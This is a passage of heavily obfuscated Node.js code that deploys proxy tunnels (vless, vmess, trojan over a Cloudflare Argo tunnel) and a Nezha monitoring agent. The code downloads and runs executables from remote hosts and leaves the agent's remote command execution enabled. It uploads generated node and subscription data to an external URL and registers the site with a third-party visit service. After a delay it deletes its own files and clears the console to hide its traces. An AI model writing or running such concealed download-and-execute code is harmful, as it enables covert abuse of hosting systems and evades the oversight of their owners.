_0x244e44=JSON[_0x12bca2(0x1c9)]({'nodes':_0x588b8b});try{const _0x2738cd=await axios['post'](UPLOAD_URL+_0x12bca2(_0x16ac18._0x102957),_0x244e44,{'headers':{'Content-Type':_0x12bca2(_0x16ac18._0x46e42e)}});return _0x2738cd&&_0x2738cd[_0x12bca2(_0x16ac18._0x227d0d)]===0xc8?(console[_0x12bca2(_0x16ac18._0x14411a)](_0x12bca2(0x23a)),_0x2738cd):null;}catch(_0x591ab5){return null;}}else return;}}function cleanFiles(){const _0x3c5614={_0x122196:0x23f,_0x2b8155:0x1f2,_0x241245:0x1a8},_0x5c93a1={_0x42a922:0x26e,_0x172c30:0x253,_0x1a6832:0x223};setTimeout(()=>{const _0x489067=_0x170e,_0x4b0967=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b0967[_0x489067(0x200)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4b0967[_0x489067(0x200)](phpPath);process[_0x489067(_0x3c5614._0x122196)]===_0x489067(0x268)?exec(_0x489067(_0x3c5614._0x2b8155)+_0x4b0967['join']('\x20')+_0x489067(_0x3c5614._0x241245),_0x4cd4f5=>{const _0x5d5614=_0x489067;console[_0x5d5614(_0x5c93a1._0x42a922)](),console['log']('App\x20is\x20running'),console[_0x5d5614(_0x5c93a1._0x172c30)](_0x5d5614(_0x5c93a1._0x1a6832));}):exec(_0x489067(0x237)+_0x4b0967['join']('\x20')+'\x20>/dev/null\x202>&1',_0x2a2258=>{const _0x3066bb=_0x489067;console['clear'](),console[_0x3066bb(0x253)](_0x3066bb(0x22d)),console[_0x3066bb(0x253)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x24ae(){const _0x54cd9f=['exec','\x0a\x0atrojan://','config.yaml','arm','\x0a\x20\x20tunnel:\x20','basename','42BNhMLQ','http\x20server\x20is\x20running\x20on\x20port:','tls','17292PDnBfS','country_code','stringify','sub','Unhandled\x20error\x20in\x20startserver:','/trojan-argo','util','filter','TunnelSecret','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20successfully','/vmess-argo','none','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/v1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','statSync','?encryption=none&security=tls&sni=','freedom','all','Unknown','102836SvqXte','\x20-c\x20\x22','taskkill\x20/f\x20/im\x20','cdns.doon.eu.org','pkill\x20-f\x20\x22[','toString','ArgoDomain:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','success','ARGO_PORT','.exe\x20>\x20nul\x202>&1','express','648012gaJfIc','php\x20running\x20error:\x20','\x20-p\x20','substring','listen','readFileSync','path','Download\x20','floor','\x0a\x20\x20credentials-file:\x20','del\x20/f\x20/q\x20','list.txt','status','Empowerment\x20failed\x20for\x20','/vless-argo','https+local://8.8.8.8/dns-query','createWriteStream','get','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','PORT','tcp','close','readdirSync','Subscription\x20uploaded\x20successfully','push','https://oooo.serv00.net/add-url','org','from','match','2083','countryCode','/api/add-nodes','https://amd64.ssss.nyc.mn/bot','forEach','has','base64','Skipping\x20adding\x20automatic\x20access\x20task','response','tunnel.json','\x20is\x20created','application/json','AUTO_ACCESS','quic','https://ipapi.co/json/','includes','http://ip-api.com/json/','catch','\x20is\x20running','npm\x20running\x20error:\x20','test','Content-Type','1960lTeTcK','split','205yArpPG','env','set','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20','UPLOAD_URL','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://amd64.ssss.nyc.mn/agent','error','2096','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','automatic\x20access\x20task\x20added\x20successfully','https://arm64.ssss.nyc.mn/v1','axios','CFPORT','2053','App\x20is\x20running','419018AAgBul','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeFileSync','127.0.0.1','vless','https://amd64.ssss.nyc.mn/web','&path=%2Ftrojan-argo%3Fed%3D2560#','direct','aarch64','rm\x20-rf\x20','fileUrl','ARGO_DOMAIN:','Nodes\x20uploaded\x20successfully','length','8443','unlink','Hello\x20world!','platform','NEZHA_KEY','unlinkSync','web\x20running\x20error:\x20','abcdefghijklmnopqrstuvwxyz','\x20-s\x20','21EPKkJU','/api/add-subscriptions','/sub.txt\x20saved\x20successfully','unshift','\x0aclient_secret:\x20','&path=%2Fvless-argo%3Fed%3D2560#','Add\x20automatic\x20access\x20task\x20faild:\x20','256rkwGCa','PROJECT_URL','/dev/null','373167CVaDLS','?security=tls&sni=','NEZHA_PORT','post','log','279773nWKPzL','http','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','443','trojan','send','stream','false','charAt','then','Error\x20reading\x20boot.log:','sub.txt','mkdirSync','child_process','\x20failed:\x20','data','https://arm64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','chmod','text/plain;\x20charset=utf-8','win32','utf-8','SERVER_PORT','true','2087','/config.json\x20>/dev/null\x202>&1\x20&','clear','join','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','pop','amd','\x22\x20>\x20/dev/null\x202>&1','\x20>\x20nul\x202>&1','config.json','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','UUID','pipe','\x0avless://','blackhole','existsSync','&fp=firefox&type=ws&host=','567041emmOqH','nohup\x20','NEZHA_SERVER','7f59b6e3-a832-4150-bbd3-1e57256c0e0a','block','map','boot.log','1512sKVHYg','message','./tmp','/tunnel.yml\x20run','SUB_PATH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'];_0x24ae=function(){return _0x54cd9f;};return _0x24ae();}cleanFiles();async function AddVisitTask(){const _0x17c422={_0x41b96e:0x253,_0x44ed2b:0x252,_0x50400c:0x228,_0x50d657:0x24b},_0x1449be=_0x408bc3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1449be(_0x17c422._0x41b96e)](_0x1449be(0x20c));return;}try{const _0x4f1c6d=await axios[_0x1449be(_0x17c422._0x44ed2b)](_0x1449be(0x201),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x1449be(_0x17c422._0x50400c)),_0x4f1c6d;}catch(_0x25bdb0){return console[_0x1449be(0x225)](_0x1449be(_0x17c422._0x50d657)+_0x25bdb0[_0x1449be(0x1b9)]),null;}}async function startserver(){const _0x19c4ca=_0x408bc3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x130f6f){console[_0x19c4ca(0x225)]('Error\x20in\x20startserver:',_0x130f6f);}}startserver()[_0x408bc3(0x216)](_0x5c34bb=>{const _0x2ce99e={_0xdfd5c7:0x1cb},_0x293f17=_0x408bc3;console[_0x293f17(0x225)](_0x293f17(_0x2ce99e._0xdfd5c7),_0x5c34bb);}),app[_0x408bc3(0x1ec)](PORT,()=>console['log'](_0x408bc3(0x1c5)+PORT+'!'));
